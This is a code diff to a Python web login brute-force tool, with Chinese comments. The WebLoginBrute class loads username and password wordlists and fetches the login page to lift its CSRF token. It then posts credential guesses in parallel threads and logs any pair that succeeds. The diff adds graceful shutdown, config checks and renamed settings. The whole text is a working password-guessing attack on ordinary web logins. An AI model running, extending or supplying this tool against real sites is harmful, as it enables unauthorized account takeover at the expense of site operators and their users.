@@ -24,7 +24,8 @@ class WebLoginBrute:
     核心流程调度类，负责整体爆破流程的编排与异常处理。
     """
 
-    def __init__(self, config: Config):
+    def __init__(self, config: Config) -> None:
+        assert config.url and config.action and config.users and config.passwords, "核心配置参数不能为空"
         self.config = config
         setup_logging(config.verbose)
         self.http = HttpClient(config)
@@ -32,27 +33,44 @@ class WebLoginBrute:
         self.stats = StatsManager()
         self.success = Event()
         self.executor = None
+        self._shutdown_requested = False
+        
+        # 注册信号处理器
+        signal.signal(signal.SIGINT, self._signal_handler)
+        signal.signal(signal.SIGTERM, self._signal_handler)
 
-    def run(self):
+    def _signal_handler(self, signum, frame):
+        """处理中断信号"""
+        logging.info(f"收到信号 {signum}，正在优雅关闭...")
+        self._shutdown_requested = True
+        self.success.set()
+        if self.executor:
+            self.executor.shutdown(wait=False)
+            self.executor = None
+
+    def run(self) -> None:
+        assert self.config.url and self.config.action and self.config.users and self.config.passwords, "核心配置参数不能为空"
         logging.info("开始WebLoginBrute主流程...")
-        # 1. 预解析目标域名
-        self.http.pre_resolve_targets([self.config.form, self.config.submit])
-        # 2. 加载字典
-        usernames = list(load_wordlist(self.config.users, self.config))
-        passwords = list(load_wordlist(self.config.passwords, self.config))
-        logging.info(f"加载了 {len(usernames)} 个用户名和 {len(passwords)} 个密码")
-        # 3. 恢复进度
-        loaded_attempts, stats_from_file = self.state.load_progress()
-        if stats_from_file:
-            self.stats.update_from_progress(stats_from_file)
-        # 4. 设置线程池
-        self.executor = ThreadPoolExecutor(
-            max_workers=self.config.threads, thread_name_prefix="WebLoginBrute"
-        )
-        # 5. 记录开始时间
-        self.stats.stats["start_time"] = time.time()
         try:
+            # 1. 预解析目标域名
+            self.http.pre_resolve_targets([self.config.url, self.config.action])
+            # 2. 加载字典
+            usernames = list(load_wordlist(self.config.users, self.config))
+            passwords = list(load_wordlist(self.config.passwords, self.config))
+            logging.info(f"加载了 {len(usernames)} 个用户名和 {len(passwords)} 个密码")
+            # 3. 恢复进度
+            loaded_attempts, stats_from_file = self.state.load_progress()
+            if stats_from_file:
+                self.stats.update_from_progress(stats_from_file)
+            # 4. 设置线程池
+            self.executor = ThreadPoolExecutor(
+                max_workers=self.config.threads, thread_name_prefix="WebLoginBrute"
+            )
+            # 5. 记录开始时间
+            self.stats.stats["start_time"] = time.time()
+            
             self._brute_force(usernames, passwords)
+            
         except KeyboardInterrupt:
             logging.info("用户中断操作，保存进度...")
             self.state.save_progress(self.stats.get_stats())
@@ -60,12 +78,23 @@ class WebLoginBrute:
             logging.error(f"运行过程中发生错误: {e}")
             self.state.save_progress(self.stats.get_stats())
         finally:
+            # 确保线程池正确关闭
+            if self.executor:
+                try:
+                    self.executor.shutdown(wait=True)
+                    logging.debug("线程池已关闭")
+                except Exception as e:
+                    logging.warning(f"关闭线程池时发生错误: {e}")
+                self.executor = None
+            
             self.stats.stats["end_time"] = time.time()
             self.stats.finalize()
             self.stats.print_final_report()
             if self.success.is_set():
                 self.state.cleanup_progress_file()
             self.http.close_all_sessions()
+            import logging as _logging
+            _logging.shutdown()
 
     def _brute_force(self, usernames: List[str], passwords: List[str]):
         total_combinations = len(usernames) * len(passwords)
@@ -83,7 +112,7 @@ class WebLoginBrute:
             raise RuntimeError("线程池未初始化")
         futures = []
         for username, password in combinations:
-            if self.success.is_set():
+            if self.success.is_set() or self._shutdown_requested:
                 break
             future = self.executor.submit(self._try_login, username, password)
             futures.append(future)
@@ -104,12 +133,12 @@ class WebLoginBrute:
                 logging.error(f"任务执行失败: {e}")
 
     def _try_login(self, username: str, password: str) -> bool:
-        if self.success.is_set():
+        if self.success.is_set() or self._shutdown_requested:
             return False
         # 检查频率限制、对抗级别等可在此扩展
         try:
             # 1. 获取登录页面，提取token
-            resp = self.http.get(self.config.form)
+            resp = self.http.get(self.config.url)
             if not resp or not resp.text:
                 self.stats.update("other_errors")
                 return False
@@ -125,10 +154,10 @@ class WebLoginBrute:
             data = {"username": username, "password": password}
             if self.config.csrf and token:
                 data[self.config.csrf] = token
-            if self.config.field and self.config.value:
-                data[self.config.field] = self.config.value
+            if self.config.login_field and self.config.login_value:
+                data[self.config.login_field] = self.config.login_value
             # 3. 发送登录请求
-            resp2 = self.http.post(self.config.submit, data=data)
+            resp2 = self.http.post(self.config.action, data=data)
             # 4. 检查登录结果
             if self._check_login_success(resp2):
                 logging.info(f"登录成功: {username}:{password}")
